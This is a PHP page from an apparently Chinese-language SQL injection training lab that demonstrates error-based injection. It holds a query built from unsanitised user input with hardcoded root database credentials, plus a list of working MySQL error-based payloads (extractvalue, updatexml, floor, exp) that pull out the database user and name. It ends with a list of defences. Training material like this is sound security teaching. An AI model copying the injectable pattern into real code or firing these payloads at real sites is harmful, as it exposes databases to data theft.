<?php
// 报错注入场景
// 使用真实MySQL数据库

// 数据库连接信息
$servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zhao";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 初始化数据库表和数据
function initDatabase($conn) {
    // 创建users表
    $create_users_sql = "CREATE TABLE IF NOT EXISTS users (
        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(30) NOT NULL,
        password VARCHAR(30) NOT NULL,
        email VARCHAR(50) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $conn->query($create_users_sql);
    
    // 插入模拟数据
    $insert_users_sql = "INSERT IGNORE INTO users (username, password, email) VALUES
    ('admin', 'admin123', 'admin@example.com'),
    ('user1', 'password1', 'user1@example.com')";
    $conn->query($insert_users_sql);
}

// 数据库已在init_db.php中初始化

// 模拟数据库查询函数
function query($sql, $conn) {
    // 执行查询
    $result = $conn->query($sql);
    
    if (!$result) {
        // 捕获数据库错误
        throw new Exception($conn->error);
    }
    
    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }
    
    return $rows;
}

$id = $_GET['id'] ?? 1;
$error = '';
$results = [];

// 执行查询（存在SQL注入漏洞）
$sql = "SELECT * FROM users WHERE id=$id";
try {
    $results = query($sql, $conn);
} catch (Exception $e) {
    $error = $e->getMessage();
}

// 关闭连接
$conn->close();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>报错注入 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #e8f4fd;
            border-left: 5px solid #4facfe;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .query-box {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .error-box {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }
        .results-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .results-table th,
        .results-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        .results-table th {
            background: #4facfe;
            color: white;
            font-weight: 600;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #4facfe;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 报错注入漏洞</h4>
                <p>本页面存在报错注入漏洞，通过构造特殊的SQL语句触发数据库错误，从而获取敏感信息。</p>
            </div>
            
            <h2>2. 💥 报错注入</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                报错注入是一种通过触发数据库错误来获取敏感信息的SQL注入技术。<br>
                攻击者构造特殊的SQL语句，利用数据库的错误机制，将查询结果包含在错误信息中。<br>
                <br>
                <strong>适用场景：</strong>页面会显示数据库错误信息，且普通注入无法获取结果时
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户查询（存在漏洞）</h3>
            <div class="query-box">
                <form method="GET">
                    <div class="input-group">
                        <input type="text" name="id" placeholder="输入用户ID..." value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" class="btn">查询</button>
                    </div>
                </form>
                
                <div class="sql-code">
                    <?php echo htmlspecialchars($sql); ?>
                </div>
                
                <?php if ($error): ?>
                <div class="error-box">
                    <strong>错误信息：</strong><?php echo htmlspecialchars($error); ?>
                </div>
                <?php endif; ?>
                
                <?php if (!empty($results)): ?>
                <h4>查询结果：</h4>
                <table class="results-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>用户名</th>
                            <th>密码</th>
                            <th>邮箱</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['id']); ?></td>
                            <td><?php echo htmlspecialchars($row['username']); ?></td>
                            <td><?php echo htmlspecialchars($row['password']); ?></td>
                            <td><?php echo htmlspecialchars($row['email']); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <?php endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 报错注入Payload</h3>
            <div class="payload-list">
                <h4>1. extractvalue() 函数</h4>
                <code onclick="setId('1 AND extractvalue(1,concat(0x7e,(select user()),0x7e))')">1 AND extractvalue(1,concat(0x7e,(select user()),0x7e))</code>
                
                <h4>2. updatexml() 函数</h4>
                <code onclick="setId('1 AND updatexml(1,concat(0x7e,(select database()),0x7e),1)')">1 AND updatexml(1,concat(0x7e,(select database()),0x7e),1)</code>
                
                <h4>3. floor() 函数（大数溢出）</h4>
                <code onclick="setId('1 AND (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)')">1 AND (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)</code>
                
                <h4>4. exp() 函数（溢出）- MySQL 5.7+</h4>
                <code onclick="setId('1 AND exp(~(select * from (select user())a))')">1 AND exp(~(select * from (select user())a))</code>
                <code onclick="setId('1 AND (select exp(~(select * from (select user())a)))')">1 AND (select exp(~(select * from (select user())a)))</code>
                <p style="color: #ff6b6b; margin-top: 10px;">⚠️ 注意：MySQL 5.7+ 版本中，exp() 报错可能不会直接显示查询结果，建议使用 extractvalue() 或 updatexml() 函数</p>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>使用预处理语句和绑定参数<br>
                2. <strong>错误处理：</strong>不向用户显示详细的数据库错误信息<br>
                3. <strong>输入验证：</strong>对用户输入进行严格的类型检查<br>
                4. <strong>最小权限：</strong>限制数据库用户权限，禁止执行危险函数<br>
                5. <strong>WAF：</strong>部署Web应用防火墙拦截恶意请求
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setId(payload) {
            document.querySelector('input[name="id"]').value = payload;
        }
    </script>
</body>
</html>
